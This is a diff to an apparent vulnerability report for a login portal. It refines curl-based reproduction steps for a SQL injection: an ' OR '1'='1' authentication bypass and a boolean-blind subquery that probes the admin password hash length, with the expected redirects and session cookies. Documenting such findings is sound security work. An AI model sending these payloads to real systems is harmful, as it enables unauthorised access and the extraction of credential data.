@@ -33,16 +33,16 @@ curl -s -X POST https://portal.example.com/login \
 **Expect:** `"Invalid username or password."`
 2. [attacker] Send the same request with a boolean payload in the username field instead of a real value:
 ```
-curl -s -X POST https://portal.example.com/login \
+curl -si -X POST https://portal.example.com/login \
   -d "username=' OR '1'='1' -- &password=anything"
 ```
 **Expect:** 302 redirect to `/dashboard` with a `Set-Cookie` for an authenticated session, no valid credentials supplied.
-3. [attacker] Confirm the query is a general read primitive, not just an auth-check quirk. Send a boolean-blind probe on the same field:
+3. [attacker] Confirm the query is a general read primitive, not just an auth-check quirk. Send a boolean-blind probe `OR`'d against an always-false base predicate, so the subquery — not the empty username — decides the branch:
 ```
-curl -s -X POST https://portal.example.com/login \
-  -d "username=' AND (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x"
+curl -si -X POST https://portal.example.com/login \
+  -d "username=' OR (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x"
 ```
-**Expect:** 302 (true branch) confirms the password hash length guess.
+**Expect:** 302 (true branch) confirms the password hash length guess; a wrong length falls back to step 1's `"Invalid username or password."`
 
 ### Evidence
 
@@ -53,7 +53,7 @@ Location: /dashboard
 Set-Cookie: session=eyJhbGciOi...                                 <-- authenticated session, no valid password supplied
 ```
 
-**Root cause.** I tried the password field first, since that seemed the more obvious target — it turned out parameterized. The username field is the one still built by string concatenation.
+**Root cause.** The password field is parameterized; the username field is the one still built by string concatenation, which is why every payload above targets it instead.
 
 ### Impact
 
